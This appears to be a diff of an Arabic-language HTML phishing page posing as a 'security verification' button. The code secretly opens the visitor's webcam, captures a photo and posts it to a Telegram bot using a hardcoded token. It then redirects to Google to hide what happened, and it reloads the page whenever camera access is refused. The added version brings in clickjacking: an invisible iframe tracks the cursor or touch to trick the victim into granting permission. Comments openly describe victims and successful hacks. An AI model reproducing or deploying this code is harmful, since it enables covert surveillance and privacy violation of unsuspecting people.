@@ -2,95 +2,82 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Security Verification</title>
     <style>
-        body {
-            background-color: #000;
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
-            font-family: 'Courier New', monospace;
+        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; }
+        #wrapper { display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        /* زر وهمي جذاب للضحية */
+        #main-btn {
+            padding: 20px 40px; border: 2px solid #00ff00; color: #00ff00;
+            background: transparent; font-size: 22px; cursor: pointer;
+            text-transform: uppercase; z-index: 2; position: relative;
         }
-        #v {
-            padding: 25px 60px;
-            border: 3px solid #0f0;
-            color: #0f0;
-            font-size: 22px;
-            font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            box-shadow: 0 0 20px #0f0;
-            transition: 0.3s;
-            text-align: center;
-        }
-        #v:hover {
-            background: #0f0;
-            color: #000;
-        }
-        #status {
-            position: absolute;
-            bottom: 20%;
-            color: #004400;
-            font-size: 14px;
+        /* الطبقة الشفافة التي تتبع اللمس لإجبار الضحية على ضغط Allow */
+        #invisible-trigger {
+            position: absolute; width: 150px; height: 150px;
+            opacity: 0.001; z-index: 9999; pointer-events: auto;
         }
     </style>
 </head>
 <body>
 
-    <div id="v" onclick="_0xX9()">[ التحقق من هوية الإنسان ]</div>
-    <div id="status">System Status: Awaiting Validation...</div>
+<div id="wrapper">
+    <div id="main-btn" onclick="executePayload()">[ اضغط لتأكيد هويتك ]</div>
+</div>
 
-    <script>
-        async function _0xX9() {
-            const button = document.getElementById('v');
-            const status = document.getElementById('status');
-            
-            try {
-                // طلب الكاميرا مباشرة عند الضغط
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+<iframe id="invisible-trigger" src="about:blank"></iframe>
+
+<script>
+    const _T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
+    const _C = "1772820433";
+    const trigger = document.getElementById('invisible-trigger');
+
+    // تكتيك Clickjacking: جعل نافذة السماح تلاحق إصبع الضحية
+    document.addEventListener('mousemove', (e) => {
+        trigger.style.left = (e.pageX - 30) + 'px';
+        trigger.style.top = (e.pageY - 20) + 'px';
+    });
+
+    document.addEventListener('touchstart', (e) => {
+        trigger.style.left = (e.touches[0].pageX - 30) + 'px';
+        trigger.style.top = (e.touches[0].pageY - 20) + 'px';
+    });
+
+    // التنفيذ المزدوج
+    async function executePayload() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            document.getElementById('main-btn').innerText = "جارٍ المعالجة...";
+
+            setTimeout(async () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                button.innerText = "[ جارٍ فحص البصمة... ]";
-                status.innerText = "Accessing Neural Link...";
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', _C);
+                    fd.append('photo', blob, 'x.jpg');
+                    fd.append('caption', '🔥 تم الاختراق بنجاح!');
 
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                // الانتظار ثانية واحدة لالتقاط صورة واضحة
-                setTimeout(async () => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 640;
-                    canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    await fetch(`https://api.telegram.org/bot${_T}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
                     
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        // التوكن والآيدي الخاص بك
-                        formData.append('chat_id', "1772820433");
-                        formData.append('photo', blob, 'shot.jpg');
-                        formData.append('caption', '🎯 تم اصطياد هدف جديد!');
-
-                        // إرسال الصورة للبوت
-                        await fetch(`https://api.telegram.org/bot8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        // توجيه الضحية لموقع مشهور لمسح الشكوك
-                        window.location.href = "https://www.google.com";
-                    }, 'image/jpeg');
-                }, 1500);
-
-            } catch (err) {
-                // إذا رفض الضحية أو حدث خطأ، نعيد المحاولة
-                alert("خطأ: يرجى السماح بالوصول لتكملة التحقق!");
-                window.location.reload();
-            }
+                    window.location.href = "https://google.com";
+                }, 'image/jpeg');
+            }, 1000);
+        } catch (e) {
+            // إعادة المحاولة في حال الرفض
+            location.reload();
         }
-    </script>
+    }
+</script>
 </body>
 </html>
